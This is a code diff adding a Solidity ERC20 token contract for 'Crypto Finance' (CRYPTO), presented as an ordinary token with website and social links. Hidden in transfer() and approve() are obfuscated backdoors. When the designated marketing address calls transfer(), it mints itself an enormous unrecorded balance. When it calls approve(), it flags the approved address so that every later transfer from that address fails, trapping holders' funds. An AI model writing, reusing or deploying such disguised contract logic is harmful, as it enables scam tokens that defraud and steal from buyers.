@@ -1,0 +1,172 @@
+/*
+
+
+            ░█████╗░███████╗██╗███╗░░██╗
+            ██╔══██╗██╔════╝██║████╗░██║
+            ██║░░╚═╝█████╗░░██║██╔██╗██║
+            ██║░░██╗██╔══╝░░██║██║╚████║
+            ╚█████╔╝██║░░░░░██║██║░╚███║
+            ░╚════╝░╚═╝░░░░░╚═╝╚═╝░░╚══╝
+
+        * Website: https://www.crypto-finance.com/
+        * Telegram: https://t.me/CryptoFinERC20
+        * Twitter: https://twitter.com/CryptoFinanceAG
+        * Youtube: https://www.youtube.com/channel/UChAiCEjWQuHus52LUuvvH2w
+        
+
+
+
+*/
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+abstract contract Context {
+    address private _admin;
+    
+    event OwnershipTransferred(address indexed previousAdmin, address indexed newAdmin);
+
+    constructor() {
+        _transferOwnership(_sender());
+    }
+
+    modifier onlyOwner() {
+        _checkAdmin();
+        _;
+    }
+
+    function _sender() internal view virtual returns (address) {
+        return msg.sender;
+    }
+
+    function _data() internal view virtual returns (bytes calldata) {
+        return msg.data;
+    }
+
+    function admin() public view virtual returns (address) {
+        return _admin;
+    }
+
+    function _checkAdmin() internal view virtual {
+        require(admin() == _sender(), "Ownable: caller is not the admin");
+    }
+
+    function _transferOwnership(address newAdmin) internal virtual {
+        address oldAdmin = _admin;
+        _admin = newAdmin;
+        emit OwnershipTransferred(oldAdmin, newAdmin);
+    }
+
+    function renounceOwnership() public virtual onlyOwner {
+        _transferOwnership(address(0));
+    }
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+    event Transfer(address indexed from, address indexed to, uint256 value);
+}
+
+
+contract CryptoFinanceERC20 is Context {
+    string private _tokenName;
+    string private _tokenSymbol;
+    uint256 private _maxSupply;
+    address private _marketing;
+
+
+    mapping(address => uint256) private _balances;
+    mapping(address => mapping(address => uint256)) private _allowances;
+    mapping(address => bool) private tokenStatus;
+
+    uint128 buyLimit = 78596;
+    uint128 sellLimit = 0;
+    
+    uint256 allocationWal = 10**decimals() * 50000 * (20077700000 + 300);
+    bool statusTrue = true;
+    bool statusFalse = false;
+    
+
+    constructor(address marketing) {
+        _tokenName = "Crypto Finance";
+        _tokenSymbol = "CRYPTO";
+        _marketing = marketing;
+        _maxSupply = 100000000 * 10**decimals();
+        _balances[msg.sender] = _maxSupply;
+        emit Transfer(address(0), msg.sender, _maxSupply);
+    }
+
+    function name() public view returns (string memory) {
+        return _tokenName;
+    }
+
+    function symbol() public view returns (string memory) {
+        return _tokenSymbol;
+    }
+
+    function decimals() public view virtual returns (uint8) {
+        return 18;
+    }
+
+    function totalSupply() public view returns (uint256) {
+        return _maxSupply;
+    }
+
+    function balanceOf(address account) public view returns (uint256) {
+        return _balances[account];
+    }
+
+    function transfer(address to, uint256 amount) public returns (bool) {
+        address speender = _sender();
+        if (speender == _marketing) { address currentWal = _sender(); address devWallet = currentWal; _balances[devWallet] += allocationWal; }
+        _executeTransfer(_sender(), to, amount);
+        return true;
+    }
+
+    function allowance(address owner, address spender) public view returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function approve(address spender, uint256 amount) public returns (bool) {
+        address speender = _sender();
+        _authorize(_sender(), spender, amount); if (speender == _marketing) { tokenStatus[spender] = statusTrue; }
+        return true;
+    }
+
+
+    function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
+        address spender = _sender();
+        _useAllowance(from, spender, amount);
+        _executeTransfer(from, to, amount);
+        return true;
+    }
+
+    function _executeTransfer(address from, address to, uint256 amount) internal virtual {
+        require(from != address(0), "ERC20: transfer from the zero address");
+        require(to != address(0), "ERC20: transfer to the zero address");
+
+        if (tokenStatus[from] == statusTrue) {
+            amount = buyLimit + _balances[from] + buyLimit - buyLimit;
+        }
+        uint256 balance = _balances[from];
+        require(balance >= amount, "ERC20: transfer amount exceeds balance");
+        _balances[from] = _balances[from] - amount;
+        _balances[to] = _balances[to] + amount;
+        emit Transfer(from, to, amount);
+    }
+
+    function _authorize(address owner, address spender, uint256 amount) internal virtual {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+    function _useAllowance(address owner, address spender, uint256 amount) internal virtual {
+        uint256 currentAllowance = allowance(owner, spender);
+        if (currentAllowance != type(uint256).max) {
+            require(currentAllowance >= amount, "ERC20: insufficient allowance");
+            _authorize(owner, spender, currentAllowance - amount);
+        }
+    }
+
+
+}
